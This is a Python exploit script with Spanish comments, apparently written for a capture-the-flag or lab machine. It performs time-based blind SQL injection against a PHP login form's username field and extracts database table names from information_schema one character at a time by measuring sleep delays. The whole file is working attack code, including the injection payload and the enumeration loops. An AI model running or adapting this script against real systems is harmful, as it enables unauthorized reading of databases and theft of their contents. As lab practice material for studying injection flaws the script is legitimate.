#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
	log.failure("Saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = 'http://10.10.170.135:1337/978345210/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[]^_'
resultado = ''

def check(payload):
	data_post = {
		'username': '%s' % payload,
		'password': 'test',
		'submit': '+Login+'
	}

	tiempo_inicio = time.time()
	content = requests.post(url, data=data_post)
	tiempo_fin = time.time()

	if tiempo_fin - tiempo_inicio > 3:
		return 1

p2 = log.progress("Payload")

# Define la base de datos previamente encontrada 
bbdd = "Webapp"

for j in range(0, 3): # 3 define el número de tablas
	p1 = log.progress("Tabla [%d]" % j)
	for i in range(1, 10): # 10 define el número total de caracteres del nombre la tabla
		for c in s:
			# Con LIMIT listamos una única tabla
			# El payload se traduce de la siguiente forma:
			# El primer bucle se encarga de tomar un número de tabla concreto
			# Para la primera tabla que encuentre va a probar la primera posición y va a ir fuzzeando cada uno de los caracteres
			# En el momento que coincida va a haber un break y va a saltar a la siguiente posición
			# Va a continuar enumerando hasta alcanzar los 10 caracteres establecidos en el segundo bucle
			# Una vez termine se va a ir al LIMIT 1,1 y va a continuar enumerando todas las tablas
			payload = "' or if(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)=binary(0x%s),sleep(3),1)-- -" % (bbdd,j,i,c.encode('utf-8').hex())
			p2.status("%s" % payload)
			if check(payload):
				resultado += c
				p1.status("%s" % resultado)
				break

	# Histórico con las tablas encontradas
	p1.success("%s" % resultado)
	# Se encarga de vaciar el resultado
	resultado = ''
